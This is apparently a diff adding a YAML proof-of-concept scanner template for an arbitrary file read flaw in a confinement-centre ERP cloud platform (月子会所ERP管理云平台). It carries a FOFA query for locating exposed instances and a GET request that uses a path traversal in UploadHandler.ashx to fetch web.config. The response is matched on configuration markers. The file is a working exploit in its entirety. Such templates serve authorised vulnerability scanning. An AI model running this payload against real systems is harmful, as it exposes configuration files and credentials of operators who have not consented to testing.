@@ -1,0 +1,15 @@
+id: poc-yaml-jintongfang-erp-uploadhandler-ashx-anyfile-read
+info:
+  name: 月子会所ERP管理云平台 UploadHandler.ashx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 月子会所ERP管理云平台
+  fofa: app="妈妈宝盒-ERP"
+requests:
+- method: GET
+  path: /Page/upload/UploadHandler.ashx?url=../../web.config
+  expression: status_code == 200 && contains(body,"\"data\":") && contains(body,"</system.web>")
+    && contains(body,"<configuration>") && contains(body,"有关如何配置 ASP.NET 应用程序的详细信息")
+variables: {}
+transport: http
